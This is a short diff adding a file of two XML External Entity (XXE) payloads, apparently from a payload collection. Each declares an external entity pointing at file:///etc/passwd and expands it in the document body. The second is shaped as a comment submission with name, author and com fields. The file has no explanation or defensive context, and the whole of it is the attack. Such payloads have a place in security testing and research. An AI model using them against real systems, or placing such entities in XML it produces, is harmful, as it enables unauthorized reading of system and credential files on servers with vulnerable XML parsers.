@@ -1,0 +1,12 @@
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+
+## apply
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE comment/root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<comment>
+  <name></name>
+  <author></author>
+  <com>&read;</com>
+</comment>
